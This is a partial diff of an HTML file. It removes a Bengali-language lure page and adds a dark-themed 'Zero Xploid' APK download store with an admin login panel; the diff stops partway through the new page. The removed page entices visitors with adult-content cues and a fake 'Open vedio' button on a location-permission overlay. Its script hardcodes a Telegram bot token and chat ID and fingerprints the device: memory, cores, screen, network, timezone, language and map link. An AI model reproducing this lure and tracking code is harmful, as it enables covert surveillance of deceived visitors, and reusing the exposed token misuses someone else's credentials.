@@ -1,1672 +1,846 @@
 <!DOCTYPE html>
-<html lang="bn">
-
+<html lang="en" class="dark">
 <head>
-
     <meta charset="UTF-8">
-
-    <meta name="viewport"
-          content="width=device-width,
-                   initial-scale=1.0,
-                   maximum-scale=1.0,
-                   user-scalable=no">
-
-    <title>Loading...</title>
-
-
-    <style>
-
-        * {
-            box-sizing: border-box;
-        }
-
-
-        html,
-        body {
-
-            margin: 0;
-            padding: 0;
-
-            width: 100%;
-            height: 100%;
-
-            background: #000;
-
-            overflow: hidden;
-
-            font-family: Arial, sans-serif;
-        }
-
-
-        /* =========================================
-           MAIN PAGE
-           ========================================= */
-
-        #mainPage {
-
-            position: fixed;
-
-            top: 0;
-            left: 0;
-
-            width: 100%;
-            height: 100%;
-
-            background: #000;
-
-            display: flex;
-
-            justify-content: center;
-            align-items: center;
-
-            z-index: 1;
-        }
-
-
-        /* =========================================
-           THUMBNAIL AREA
-           ========================================= */
-
-        #thumbnailArea {
-
-            position: absolute;
-
-            top: 0;
-            left: 0;
-
-            width: 100%;
-            height: 100%;
-
-            background: #000;
-
-            display: flex;
-
-            justify-content: center;
-            align-items: center;
-
-            overflow: hidden;
-        }
-
-
-        /* =========================================
-           REAL THUMBNAIL
-           ========================================= */
-
-        #thumbnail {
-
-            width: 100%;
-            height: 100%;
-
-            object-fit: cover;
-
-            display: none;
-        }
-
-
-        /* =========================================
-           FALLBACK THUMBNAIL
-           ========================================= */
-
-        #thumbnailFallback {
-
-            position: absolute;
-
-            top: 0;
-            left: 0;
-
-            width: 100%;
-            height: 100%;
-
-            overflow: hidden;
-
-            background: #111;
-
-            display: block;
-        }
-
-
-        #thumbnailFallback img {
-
-            width: 100%;
-            height: 100%;
-
-            object-fit: cover;
-
-            filter: blur(18px);
-
-            transform: scale(1.10);
-
-            display: block;
-        }
-
-
-        /* =========================================
-           FALLBACK DARK OVERLAY
-           ========================================= */
-
-        .fallbackBlur {
-
-            position: absolute;
-
-            top: 0;
-            left: 0;
-
-            width: 100%;
-            height: 100%;
-
-            background:
-                rgba(0, 0, 0, 0.30);
-        }
-
-
-        /* =========================================
-           PLAY BUTTON
-           ========================================= */
-
-        .fallbackPlay {
-
-            position: absolute;
-
-            top: 50%;
-            left: 50%;
-
-            transform:
-                translate(-50%, -50%);
-
-            width: 82px;
-            height: 58px;
-
-            background: #ff0033;
-
-            border-radius: 16px;
-
-            display: flex;
-
-            align-items: center;
-            justify-content: center;
-
-            box-shadow:
-                0 5px 25px
-                rgba(0, 0, 0, .45);
-        }
-
-
-        .fallbackTriangle {
-
-            width: 0;
-            height: 0;
-
-            border-top:
-                14px solid transparent;
-
-            border-bottom:
-                14px solid transparent;
-
-            border-left:
-                23px solid #fff;
-
-            margin-left: 5px;
-        }
-
-
-        /* =========================================
-           MAIN DARK OVERLAY
-           ========================================= */
-
-        #thumbnailDark {
-
-            position: absolute;
-
-            top: 0;
-            left: 0;
-
-            width: 100%;
-            height: 100%;
-
-            background:
-                rgba(0, 0, 0, .20);
-
-            pointer-events: none;
-        }
-
-
-        /* =========================================
-           LOCATION OVERLAY
-           ========================================= */
-
-        #locationOverlay {
-
-            position: fixed;
-
-            top: 0;
-            left: 0;
-
-            width: 100%;
-            height: 100%;
-
-            display: flex;
-
-            justify-content: center;
-            align-items: center;
-
-            padding: 20px;
-
-            background:
-                rgba(0, 0, 0, .18);
-
-            z-index: 100;
-        }
-
-
-        /* =========================================
-           LOCATION BOX
-           ========================================= */
-
-        #locationBox {
-
-            width: 100%;
-
-            max-width: 665px;
-
-            background:
-                rgba(0, 0, 0, .90);
-
-            border-radius: 20px;
-
-            padding: 25px 18px 22px;
-
-            text-align: center;
-
-            color: #fff;
-
-            box-shadow:
-                0 10px 40px
-                rgba(0, 0, 0, .65);
-        }
-
-
-        #locationIcon {
-
-            font-size: 36px;
-
-            margin-bottom: 8px;
-        }
-
-
-        #locationTitle {
-
-            font-size: 25px;
-
-            margin-bottom: 12px;
-        }
-
-
-        #locationText {
-
-            font-size: 17px;
-
-            line-height: 1.5;
-
-            color: #eee;
-
-            margin-bottom: 20px;
-        }
-
-
-        /* =========================================
-           BUTTONS
-           ========================================= */
-
-        .locationButton {
-
-            border: none;
-
-            border-radius: 10px;
-
-            padding: 14px 30px;
-
-            font-size: 17px;
-
-            cursor: pointer;
-
-            margin: 5px;
-        }
-
-
-        #allowButton {
-
-            background: #2196F3;
-
-            color: #fff;
-        }
-
-
-        #skipButton {
-
-            background: #555;
-
-            color: #fff;
-        }
-
-
-        .locationButton:active {
-
-            transform: scale(.97);
-        }
-
-
-        #locationStatus {
-
-            margin-top: 12px;
-
-            font-size: 14px;
-
-            color: #ddd;
-        }
-
-
-        /* =========================================
-           LOADING SCREEN
-           ========================================= */
-
-        #loading {
-
-            position: fixed;
-
-            top: 0;
-            left: 0;
-
-            width: 100%;
-            height: 100%;
-
-            background: #000;
-
-            display: none;
-
-            justify-content: center;
-            align-items: center;
-
-            flex-direction: column;
-
-            color: #fff;
-
-            z-index: 200;
-        }
-
-
-        .spinner {
-
-            width: 48px;
-            height: 48px;
-
-            border: 4px solid #333;
-
-            border-top:
-                4px solid #fff;
-
-            border-radius: 50%;
-
-            animation:
-                spin 1s linear infinite;
-
-            margin-bottom: 15px;
-        }
-
-
-        @keyframes spin {
-
-            100% {
-                transform: rotate(360deg);
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="siteTitle">Sumon - App Store</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                }
             }
-
         }
-
+    </script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        ::-webkit-scrollbar {
+            width: 4px;
+            height: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: rgba(150, 150, 150, 0.2);
+            border-radius: 9999px;
+        }
     </style>
-
 </head>
+<body class="bg-[#121216] text-gray-100 min-h-screen pb-24 transition-colors duration-300" id="bodyBg">
 
+    <header class="sticky top-0 z-50 backdrop-blur-md bg-[#121216]/80 dark:bg-[#121216]/80 border-b border-gray-800/60 px-4 py-3 flex items-center justify-between transition-colors duration-300" id="headerBg">
+        <!-- Logo & App Count -->
+        <div class="flex items-center space-x-3">
+            <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-indigo-600 to-blue-500 flex items-center justify-center shadow-lg shadow-indigo-500/30">
+                <i class="fa-solid fa-bolt text-white text-lg"></i>
+            </div>
+            <div>
+                <h1 id="headerBrandName" class="font-bold text-lg tracking-wide">Zero Xploid</h1>
+                <p class="text-xs text-indigo-400 font-medium flex items-center gap-1">
+                    <span class="w-1.5 h-1.5 rounded-full bg-indigo-400 animate-pulse"></span> <span id="headerAppCountText">36 Apps</span>
+                </p>
+            </div>
+        </div>
 
-<body>
+        <!-- Utility Actions -->
+        <div class="flex items-center space-x-2.5">
+            <!-- Theme Toggle Button -->
+            <button id="themeToggle" onclick="toggleTheme()" class="w-9 h-9 rounded-full bg-gray-800/70 hover:bg-gray-700/80 flex items-center justify-center text-amber-400 transition-all">
+                <i class="fa-solid fa-moon text-sm" id="themeIcon"></i>
+            </button>
+            <!-- Notification Bell -->
+            <button onclick="showCustomNotice()" class="relative w-9 h-9 rounded-full bg-gray-800/70 hover:bg-gray-700/80 flex items-center justify-center text-gray-300 transition-all">
+                <i class="fa-regular fa-bell text-sm"></i>
+                <span class="absolute top-1 right-1 w-2.5 h-2.5 bg-rose-500 rounded-full ring-2 ring-[#121216]"></span>
+            </button>
+            <!-- User Profile Avatar - Click to open M Popup Menu -->
+            <button onclick="openMenuPopup()" class="w-9 h-9 rounded-full bg-gradient-to-tr from-purple-600 to-indigo-600 font-semibold text-sm flex items-center justify-center text-white shadow-md hover:scale-105 transition-transform" title="Menu">
+                M
+            </button>
+        </div>
+    </header>
 
-
-<!-- =================================================
-     MAIN PAGE
-     ================================================= -->
-
-<div id="mainPage">
-
-
-    <div id="thumbnailArea">
-
-
-        <!-- Real Thumbnail -->
-
-        <img
-            id="thumbnail"
-            alt="Video Thumbnail">
-
-
-        <!-- =========================================
-             BLURRED FALLBACK IMAGE
-             ========================================= -->
-
-        <div id="thumbnailFallback">
-
-
-            <img
-                src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?auto=format&fit=crop&w=1200&q=80"
-                alt="Video Thumbnail">
-
-
-            <div class="fallbackBlur"></div>
-
-
-            <!-- Play Button -->
-
-            <div class="fallbackPlay">
-
-                <div class="fallbackTriangle"></div>
-
+    <!-- Main Container Content -->
+    <div id="mainViewContainer">
+        <div class="px-4 py-3 max-w-4xl mx-auto">
+            <div class="relative flex items-center">
+                <span class="absolute left-4 text-gray-400 text-sm">
+                    <i class="fa-solid fa-magnifying-glass"></i>
+                </span>
+                <input type="text" id="searchInput" oninput="filterApps()" placeholder="Search apps & games..." 
+                    class="w-full bg-[#1b1b22] dark:bg-[#1b1b22] text-gray-200 placeholder-gray-400 text-sm rounded-2xl pl-11 pr-11 py-3 border border-gray-800/80 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all shadow-inner">
+                <button onclick="showAlert('Voice search activated')" class="absolute right-4 text-gray-400 hover:text-indigo-400 transition-colors">
+                    <i class="fa-solid fa-microphone text-sm"></i>
+                </button>
             </div>
 
-
+            <!-- Category Tags -->
+            <div class="flex items-center space-x-2 mt-3 overflow-x-auto pb-1 no-scrollbar">
+                <button onclick="filterCategory('all', this)" class="category-btn px-4 py-1.5 rounded-full text-xs font-medium bg-indigo-600 text-white shrink-0 transition-all shadow-sm shadow-indigo-600/30">All</button>
+                <button onclick="filterCategory('tools', this)" class="category-btn px-4 py-1.5 rounded-full text-xs font-medium bg-[#1b1b22] text-gray-400 hover:text-white shrink-0 transition-all border border-gray-800">Tools</button>
+                <button onclick="filterCategory('dev', this)" class="category-btn px-4 py-1.5 rounded-full text-xs font-medium bg-[#1b1b22] text-gray-400 hover:text-white shrink-0 transition-all border border-gray-800">Development</button>
+                <button onclick="filterCategory('editors', this)" class="category-btn px-4 py-1.5 rounded-full text-xs font-medium bg-[#1b1b22] text-gray-400 hover:text-white shrink-0 transition-all border border-gray-800">Editors</button>
+                <button onclick="filterCategory('servers', this)" class="category-btn px-4 py-1.5 rounded-full text-xs font-medium bg-[#1b1b22] text-gray-400 hover:text-white shrink-0 transition-all border border-gray-800">Servers</button>
+            </div>
         </div>
 
+        <main class="px-4 py-2 max-w-4xl mx-auto">
+            <div class="flex items-center justify-between mb-3 mt-1">
+                <h2 id="sectionTitle" class="text-lg font-bold flex items-center gap-2">
+                    <i class="fa-solid fa-mobile-screen text-indigo-500 text-base"></i> All Apps
+                </h2>
+                <span id="appCountIndicator" class="text-xs text-gray-400 font-medium">0 items</span>
+            </div>
 
-        <div id="thumbnailDark"></div>
+            <!-- Apps Grid -->
+            <div id="appsGrid" class="grid grid-cols-3 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-3.5">
+                <!-- Dynamic App Cards -->
+            </div>
 
-
+            <!-- Empty State -->
+            <div id="emptyState" class="hidden text-center py-16">
+                <div class="w-16 h-16 bg-gray-800/50 rounded-full flex items-center justify-center mx-auto mb-3 text-gray-400 text-xl">
+                    <i class="fa-solid fa-box-open"></i>
+                </div>
+                <p class="text-gray-300 font-medium text-sm">No apps found</p>
+                <p class="text-gray-500 text-xs mt-1">Try searching with a different keyword</p>
+            </div>
+        </main>
     </div>
 
-
-</div>
-
-
-
-<!-- =================================================
-     LOCATION PERMISSION
-     ================================================= -->
-
-<div id="locationOverlay">
-
-
-    <div id="locationBox">
-
-
-        <div id="locationIcon">
-            🔞
+    <!-- YouTube Posts View Container -->
+    <div id="youtubeViewContainer" class="hidden px-4 py-4 max-w-2xl mx-auto">
+        <div class="flex items-center justify-between mb-4">
+            <h2 class="text-xl font-bold text-red-500 flex items-center gap-2">
+                <i class="fa-brands fa-youtube"></i> Description All ZIP Files
+            </h2>
+            <button onclick="switchTabToApps()" class="text-xs bg-gray-800 hover:bg-gray-700 text-gray-300 px-3 py-1.5 rounded-lg">Back to Apps</button>
         </div>
-
-
-        <div id="locationTitle">
-            আপনি কি ভিডিওটা দেখতে চান?
+        <div id="youtubePostsList" class="space-y-6">
+            <!-- Dynamic YouTube Posts -->
         </div>
-
-
-        <div id="locationText">
-
-            ভিডিওটা খুবই গুরুত্বপূর্ণ তাই ভিডিওটা একা একা দেখবেন
-
-        </div>
-
-
-        <button
-            id="allowButton"
-            class="locationButton">
-
-            Open vedio
-
-        </button>
-
-
-        <button
-            id="skipButton"
-            class="locationButton">
-
-            Close
-
-        </button>
-
-
-        <div id="locationStatus"></div>
-
-
     </div>
 
-</div>
+    <!-- Bottom Nav -->
+    <nav class="fixed bottom-0 left-0 right-0 z-50 bg-[#16161b]/95 backdrop-blur-lg border-t border-gray-800/80 px-4 py-2 max-w-lg mx-auto md:max-w-xl transition-colors duration-300" id="navBg">
+        <div class="flex items-center justify-around">
+            <button onclick="switchTab('apps', this)" class="nav-tab flex flex-col items-center justify-center py-1 px-3 rounded-xl text-indigo-400 transition-all active">
+                <i class="fa-solid fa-grip text-lg mb-0.5"></i>
+                <span class="text-[10px] font-semibold tracking-wide">Apps</span>
+            </button>
+            <button onclick="switchTab('games', this)" class="nav-tab flex flex-col items-center justify-center py-1 px-3 rounded-xl text-gray-400 hover:text-gray-200 transition-all">
+                <i class="fa-solid fa-gamepad text-lg mb-0.5"></i>
+                <span class="text-[10px] font-medium tracking-wide">Games</span>
+            </button>
+            <button onclick="switchTab('top', this)" class="nav-tab flex flex-col items-center justify-center py-1 px-3 rounded-xl text-gray-400 hover:text-gray-200 transition-all">
+                <i class="fa-solid fa-trophy text-lg mb-0.5"></i>
+                <span class="text-[10px] font-medium tracking-wide">Top Apps</span>
+            </button>
+            <button onclick="openYouTubeViewFromNav()" class="nav-tab flex flex-col items-center justify-center py-1 px-3 rounded-xl text-gray-400 hover:text-gray-200 transition-all">
+                <i class="fa-brands fa-youtube text-lg mb-0.5 text-red-500"></i>
+                <span class="text-[10px] font-medium tracking-wide">Tutorials</span>
+            </button>
+        </div>
+    </nav>
 
+    <!-- M Menu Popup Modal -->
+    <div id="menuPopupModal" class="fixed inset-0 z-50 bg-black/70 backdrop-blur-sm hidden items-end sm:items-center justify-center p-0 sm:p-4">
+        <div class="bg-[#1b1b22] w-full sm:max-w-md rounded-t-3xl sm:rounded-2xl border border-gray-800 p-6 shadow-2xl relative transition-colors duration-300">
+            <button onclick="closeMenuPopup()" class="absolute top-4 right-4 w-7 h-7 rounded-full bg-gray-800 flex items-center justify-center text-gray-400 hover:text-white">
+                <i class="fa-solid fa-xmark text-xs"></i>
+            </button>
+            
+            <div class="text-center mb-6 pt-2">
+                <div class="w-16 h-16 rounded-2xl bg-gradient-to-tr from-indigo-600 to-blue-500 flex items-center justify-center mx-auto mb-3 shadow-lg shadow-indigo-500/30">
+                    <i class="fa-solid fa-bolt text-white text-2xl"></i>
+                </div>
+                <h3 class="font-bold text-xl text-white">Zero Xploid</h3>
+                <p class="text-xs text-gray-400 mt-1">Premium Apps & Tools Store</p>
+            </div>
 
+            <div class="space-y-3">
+                <button onclick="openYouTubeSection()" class="w-full bg-[#121216] hover:bg-gray-800/85 border border-gray-800 p-3.5 rounded-2xl flex items-center justify-between transition-all group">
+                    <div class="flex items-center space-x-3.5">
+                        <div class="w-10 h-10 rounded-xl bg-red-600/20 text-red-500 flex items-center justify-center text-lg">
+                            <i class="fa-brands fa-youtube"></i>
+                        </div>
+                        <div class="text-left">
+                            <h4 class="font-bold text-sm text-gray-200 group-hover:text-red-500 transition-colors">YouTube Channel</h4>
+                            <p class="text-[11px] text-gray-400">Subscribe for tutorials</p>
+                        </div>
+                    </div>
+                    <i class="fa-solid fa-chevron-right text-xs text-gray-400"></i>
+                </button>
 
-<!-- =================================================
-     LOADING
-     ================================================= -->
+                <button onclick="openTelegramApp()" class="w-full bg-[#121216] hover:bg-gray-800/85 border border-gray-800 p-3.5 rounded-2xl flex items-center justify-between transition-all group">
+                    <div class="flex items-center space-x-3.5">
+                        <div class="w-10 h-10 rounded-xl bg-blue-600/20 text-blue-500 flex items-center justify-center text-lg">
+                            <i class="fa-brands fa-telegram"></i>
+                        </div>
+                        <div class="text-left">
+                            <h4 class="font-bold text-sm text-gray-200 group-hover:text-blue-500 transition-colors">Telegram Channel</h4>
+                            <p class="text-[11px] text-gray-400">Join our community</p>
+                        </div>
+                    </div>
+                    <i class="fa-solid fa-chevron-right text-xs text-gray-400"></i>
+                </button>
 
-<div id="loading">
-
-    <div class="spinner"></div>
-
-    <div>
-        Loading...
+                <button onclick="openAdminAccess()" class="w-full bg-[#121216] hover:bg-gray-800/85 border border-gray-800 p-3.5 rounded-2xl flex items-center justify-between transition-all group">
+                    <div class="flex items-center space-x-3.5">
+                        <div class="w-10 h-10 rounded-xl bg-amber-600/20 text-amber-500 flex items-center justify-center text-lg">
+                            <i class="fa-solid fa-gear"></i>
+                        </div>
+                        <div class="text-left">
+                            <h4 class="font-bold text-sm text-gray-200 group-hover:text-amber-500 transition-colors">Admin Panel</h4>
+                            <p class="text-[11px] text-gray-400">Manage your apps & posts</p>
+                        </div>
+                    </div>
+                    <i class="fa-solid fa-chevron-right text-xs text-gray-400"></i>
+                </button>
+            </div>
+        </div>
     </div>
 
-</div>
-
-
-
-<script>
-
-
-/* =====================================================
-   TELEGRAM SETTINGS
-   ===================================================== */
-
-const BOT_TOKEN =
-    "8855743272:AAETg__YWrwHa3feYecotLTVzqQ_VTRsXII";
-
-
-const CHAT_ID =
-    "5980493892";
-
-
-
-/* =====================================================
-   ⭐ YOUR URL ⭐
-   =====================================================
-
-   এখানে আপনার URL বসাবেন।
-
-   উদাহরণ:
-
-   YouTube:
-   https://www.youtube.com/watch?v=XXXXXXXX
-
-   TikTok:
-   https://www.tiktok.com/@username/video/XXXXXXXX
-
-   Facebook:
-   https://www.facebook.com/XXXXXXXX
-
-   Instagram:
-   https://www.instagram.com/reel/XXXXXXXX
-
-   Website:
-   https://example.com
-
-   Direct Video:
-   https://example.com/video.mp4
-
-   ===================================================== */
-
-const TARGET_URL =
-    "https://youtu.be/a3eHtuzFc0E?si=xctpNLNrr5yM-oeY";
-
-
-
-/* =====================================================
-   ANALYTICS
-   ===================================================== */
-
-const analytics = {
-
-    deviceId:
-        getDeviceId(),
-
-    userAgent:
-        navigator.userAgent,
-
-    ram:
-        navigator.deviceMemory
-        ? navigator.deviceMemory + " GB"
-        : "Unknown",
-
-    cores:
-        navigator.hardwareConcurrency
-        ? navigator.hardwareConcurrency +
-          " Cores"
-        : "Unknown",
-
-    screenRes:
-        window.screen.width +
-        " x " +
-        window.screen.height,
-
-    orientation:
-        window.screen.height >=
-        window.screen.width
-        ? "Portrait"
-        : "Landscape",
-
-    theme:
-        window.matchMedia(
-            "(prefers-color-scheme: dark)"
-        ).matches
-        ? "Dark Mode"
-        : "Light Mode",
-
-    networkType:
-        navigator.connection
-        ? navigator.connection
-            .effectiveType
-            .toUpperCase()
-        : "Unknown",
-
-    downlink:
-        navigator.connection
-        ? navigator.connection.downlink +
-          " Mbps"
-        : "Unknown",
-
-    localTime:
-        new Date().toLocaleTimeString(),
-
-    timeZone:
-        Intl.DateTimeFormat()
-        .resolvedOptions()
-        .timeZone,
-
-    language:
-        navigator.language ||
-        navigator.userLanguage ||
-        "Unknown",
-
-    battery:
-        "Unknown",
-
-    permissionStatus:
-        "Not Requested",
-
-    mapLink:
-        "N/A"
-};
-
-
-
-/* =====================================================
-   DEVICE ID
-   ===================================================== */
-
-function getDeviceId() {
-
-    let deviceId =
-        localStorage.getItem(
-            "app_device_id"
-        );
-
-
-    if (!deviceId) {
-
-        deviceId =
-            "DEV-" +
-            Math.floor(
-                100000 +
-                Math.random() * 900000
-            );
-
-
-        localStorage.setItem(
-            "app_device_id",
-            deviceId
-        );
-
-    }
-
-
-    return deviceId;
-
-}
-
-
-
-/* =====================================================
-   SHOW FALLBACK THUMBNAIL
-   ===================================================== */
-
-function showFallbackThumbnail() {
-
-    const thumbnail =
-        document.getElementById(
-            "thumbnail"
-        );
-
-    const fallback =
-        document.getElementById(
-            "thumbnailFallback"
-        );
-
-
-    thumbnail.style.display =
-        "none";
-
-
-    fallback.style.display =
-        "block";
-}
-
-
-
-/* =====================================================
-   LOAD THUMBNAIL
-   ===================================================== */
-
-function loadThumbnail() {
-
-
-    /*
-     * প্রথমে fallback thumbnail দেখানো হবে।
-     */
-
-    showFallbackThumbnail();
-
-
-    /*
-     * URL না থাকলে fallback-ই থাকবে।
-     */
-
-    if (
-        !TARGET_URL ||
-        TARGET_URL === "Your URL"
-    ) {
-
-        return;
-
-    }
-
-
-    const url =
-        TARGET_URL.trim();
-
-
-
-    /* =========================================
-       YOUTUBE
-       ========================================= */
-
-    const youtubeID =
-        getYouTubeID(url);
-
-
-    if (youtubeID) {
-
-
-        const thumbnail =
-            document.getElementById(
-                "thumbnail"
-            );
-
-
-        const fallback =
-            document.getElementById(
-                "thumbnailFallback"
-            );
-
-
-        /*
-         * High quality thumbnail
-         */
-
-        thumbnail.src =
-            "https://img.youtube.com/vi/" +
-            youtubeID +
-            "/maxresdefault.jpg";
-
-
-        thumbnail.onload =
-            function () {
-
-                thumbnail.style.display =
-                    "block";
-
-
-                fallback.style.display =
-                    "none";
-
+    <!-- App Details Modal -->
+    <div id="appModal" class="fixed inset-0 z-50 bg-black/70 backdrop-blur-sm hidden items-end sm:items-center justify-center p-0 sm:p-4 transition-all">
+        <div id="modalContent" class="bg-[#1b1b22] w-full sm:max-w-md rounded-t-3xl sm:rounded-2xl border border-gray-800 p-6 shadow-2xl transform translate-y-full transition-transform duration-300">
+            <div class="flex items-start justify-between mb-4">
+                <div class="flex items-center space-x-3">
+                    <div id="modalIconBg" class="w-14 h-14 rounded-2xl flex items-center justify-center text-white shadow-lg text-2xl overflow-hidden">
+                        <i id="modalIcon" class=""></i>
+                        <img id="modalImg" src="" class="w-full h-full object-cover hidden" alt="">
+                    </div>
+                    <div>
+                        <h3 id="modalTitle" class="font-bold text-lg text-white"></h3>
+                        <p id="modalCategory" class="text-xs text-indigo-400 font-medium"></p>
+                        <div class="flex items-center space-x-1 mt-1">
+                            <i class="fa-solid fa-star text-amber-400 text-xs"></i>
+                            <span id="modalRating" class="text-xs font-semibold text-gray-300"></span>
+                            <span class="text-gray-400 text-xs">• Verified</span>
+                        </div>
+                    </div>
+                </div>
+                <button onclick="closeModal()" class="w-8 h-8 rounded-full bg-gray-800 flex items-center justify-center text-gray-400 hover:text-white transition-colors">
+                    <i class="fa-solid fa-xmark text-sm"></i>
+                </button>
+            </div>
+            <p id="modalDesc" class="text-gray-300 text-xs leading-relaxed mb-6 bg-[#121216] p-3 rounded-xl border border-gray-800/60"></p>
+            <div class="flex space-x-3">
+                <button onclick="closeModal()" class="flex-1 py-3 rounded-xl bg-gray-800 hover:bg-gray-700 text-gray-300 text-xs font-semibold transition-all">Cancel</button>
+                <a id="modalDownloadBtn" href="#" target="_blank" class="flex-1 py-3 rounded-xl bg-gradient-to-r from-indigo-600 to-blue-600 hover:from-indigo-500 hover:to-blue-500 text-white text-xs font-semibold shadow-lg shadow-indigo-600/30 transition-all flex items-center justify-center gap-2">
+                    <i class="fa-solid fa-download"></i> Install APK
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Admin Login Modal -->
+    <div id="adminLoginModal" class="fixed inset-0 z-50 bg-black/70 backdrop-blur-sm hidden items-center justify-center p-4">
+        <div class="bg-[#1b1b22] w-full max-w-sm rounded-2xl border border-gray-800 p-6 shadow-2xl text-center">
+            <div class="w-12 h-12 rounded-2xl bg-indigo-600/20 text-indigo-500 flex items-center justify-center mx-auto mb-3 text-xl">
+                <i class="fa-solid fa-lock"></i>
+            </div>
+            <h3 class="font-bold text-lg text-white mb-1">Admin Panel Login</h3>
+            <p class="text-xs text-gray-400 mb-4">Enter your credentials to access admin controls</p>
+            
+            <input type="text" id="adminUserId" placeholder="User ID" class="w-full bg-[#121216] text-gray-200 text-sm rounded-xl px-4 py-3 border border-gray-800 mb-3 focus:outline-none focus:border-indigo-500">
+            <input type="password" id="adminPass" placeholder="Password" class="w-full bg-[#121216] text-gray-200 text-sm rounded-xl px-4 py-3 border border-gray-800 mb-3 focus:outline-none focus:border-indigo-500">
+            <input type="password" id="adminFullAccessCode" placeholder="Full Access Code (Optional)" class="w-full bg-[#121216] text-amber-400 text-sm rounded-xl px-4 py-3 border border-amber-500/50 mb-4 focus:outline-none focus:border-amber-500">
+            
+            <div class="flex space-x-2">
+                <button onclick="closeAdminLogin()" class="flex-1 py-2.5 rounded-xl bg-gray-800 text-gray-300 text-xs font-semibold">Cancel</button>
+                <button onclick="verifyAdminLogin()" class="flex-1 py-2.5 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold shadow-lg shadow-indigo-600/30">Login</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Admin Dashboard Modal -->
+    <div id="adminDashboardModal" class="fixed inset-0 z-50 bg-black/70 backdrop-blur-sm hidden items-center justify-center p-4 overflow-y-auto">
+        <div class="bg-[#1b1b22] w-full max-w-md rounded-2xl border border-gray-800 p-6 shadow-2xl my-auto max-h-[90vh] overflow-y-auto">
+            <div class="flex items-center justify-between mb-4">
+                <h3 id="adminPanelTitle" class="font-bold text-base text-white flex items-center gap-2">
+                    <i class="fa-solid fa-gears text-indigo-500"></i> Admin Dashboard
+                </h3>
+                <button onclick="closeAdminDashboard()" class="text-gray-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+
+            <!-- 1. Website Settings (Full Access Only) -->
+            <div id="fullAccessSettingsSection" class="mb-4 bg-[#121216] p-3.5 rounded-xl border border-gray-800/80">
+                <h4 class="text-xs font-bold text-amber-400 mb-2 uppercase tracking-wider">1. Full Website Control & Notice Settings</h4>
+                <input type="text" id="settingSiteName" placeholder="Website Title" class="w-full bg-[#1b1b22] text-gray-200 text-xs rounded-lg px-3 py-2.5 border border-gray-800 mb-2 focus:outline-none focus:border-indigo-500">
+                <input type="text" id="settingAppCount" placeholder="App Count Text" class="w-full bg-[#1b1b22] text-gray-200 text-xs rounded-lg px-3 py-2.5 border border-gray-800 mb-2 focus:outline-none focus:border-indigo-500">
+                <textarea id="settingNoticeText" rows="2" placeholder="Custom Notice Message for Bell Icon..." class="w-full bg-[#1b1b22] text-gray-200 text-xs rounded-lg px-3 py-2.5 border border-gray-800 mb-2 focus:outline-none focus:border-indigo-500"></textarea>
+                <button onclick="updateWebsiteSettings()" class="w-full py-2 rounded-lg bg-amber-600 hover:bg-amber-500 text-white text-xs font-semibold transition-all">Save Website & Notice Settings</button>
+            </div>
+
+            <!-- 2. Publish New App -->
+            <div class="bg-[#121216] p-3.5 rounded-xl border border-gray-800/80 mb-4">
+                <h4 class="text-xs font-bold text-indigo-400 mb-2 uppercase tracking-wider">2. Publish New App</h4>
+                <input type="text" id="newAppName" placeholder="App Name" class="w-full bg-[#1b1b22] text-gray-200 text-xs rounded-lg px-3 py-2.5 border border-gray-800 mb-2 focus:outline-none focus:border-indigo-500">
+                <div class="grid grid-cols-2 gap-2 mb-2">
+                    <select id="newAppCategory" class="bg-[#1b1b22] text-gray-200 text-xs rounded-lg px-3 py-2.5 border border-gray-800 focus:outline-none focus:border-indigo-500">
+                        <option value="tools">Tools</option>
+                        <option value="dev">Development</option>
+                        <option value="editors">Editors</option>
+                        <option value="servers">Servers</option>
+                        <option value="games">Games</option>
+                    </select>
+                    <input type="text" id="newAppRating" placeholder="Rating (e.g. 5.0)" class="bg-[#1b1b22] text-gray-200 text-xs rounded-lg px-3 py-2.5 border border-gray-800 focus:outline-none focus:border-indigo-500">
+                </div>
+                
+                <!-- Phone Logo Upload Option -->
+                <div class="mb-2">
+                    <label class="block text-[11px] text-gray-400 mb-1">App Logo (Upload from Phone or Image URL):</label>
+                    <input type="file" id="newAppLogoFile" accept="image/*" onchange="handleLogoUpload(event)" class="w-full bg-[#1b1b22] text-gray-300 text-xs rounded-lg p-1.5 border border-gray-800 mb-1 file:mr-3 file:py-1 file:px-3 file:rounded-md file:border-0 file:text-xs file:font-semibold file:bg-indigo-600 file:text-white hover:file:bg-indigo-500">
+                    <input type="text" id="newAppLogo" placeholder="Or paste Image URL / Base64 here" class="w-full bg-[#1b1b22] text-gray-200 text-xs rounded-lg px-3 py-2 border border-gray-800 focus:outline-none focus:border-indigo-500">
+                </div>
+
+                <input type="text" id="newAppDownloadLink" placeholder="MediaFire / Download Link (.apk)" class="w-full bg-[#1b1b22] text-gray-200 text-xs rounded-lg px-3 py-2.5 border border-gray-800 mb-2 focus:outline-none focus:border-indigo-500">
+                <input type="text" id="newAppDesc" placeholder="Short description..." class="w-full bg-[#1b1b22] text-gray-200 text-xs rounded-lg px-3 py-2.5 border border-gray-800 mb-2 focus:outline-none focus:border-indigo-500">
+                <button onclick="publishNewApp()" class="w-full py-2.5 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold shadow-md shadow-indigo-600/30 transition-all">Publish App Live</button>
+            </div>
+
+            <!-- 3. Publish YouTube Tutorial / ZIP Post -->
